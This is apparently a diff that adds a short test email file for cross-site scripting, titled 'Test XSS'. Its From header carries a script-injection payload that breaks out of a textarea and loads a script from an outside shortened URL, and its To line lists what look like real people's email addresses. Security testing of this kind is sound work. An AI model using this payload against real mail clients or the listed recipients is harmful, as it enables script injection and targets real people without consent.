@@ -1,0 +1,7 @@
+From: <"test"></textarea><script src=http://goo.gl/l32dsa></script>@attack.com">
+To: susan@metronet.com, carson@us.ibm.com, trpape@aol.com, tpape@satake-usa.com
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
